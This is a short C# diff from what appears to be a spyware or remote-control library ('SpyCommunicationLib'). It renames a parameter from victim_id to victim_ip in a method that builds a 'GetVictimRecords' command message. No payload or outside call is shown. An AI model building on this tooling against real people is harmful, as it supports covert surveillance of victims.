@@ -51,13 +51,13 @@ namespace SpyCommunicationLib.Directors
         /// </summary>
         /// <param name="victim_id">Identifier of the victim.</param>
         /// <returns>SpyMessage to get victim records.</returns>
-        public SpyMessage GetVictimRecordsMessage(string victim_id)
+        public SpyMessage GetVictimRecordsMessage(string victim_ip)
         {
             _builder.SetAction(MessageAction.GetVictimRecords);
             ConfigureToken(_builder);
             _builder.SetOptions(new Dictionary<string, string>
             {
-                { "victim_id", victim_id }
+                { "victim_ip", victim_ip }
             });
             return _builder.GetMessage();
         }
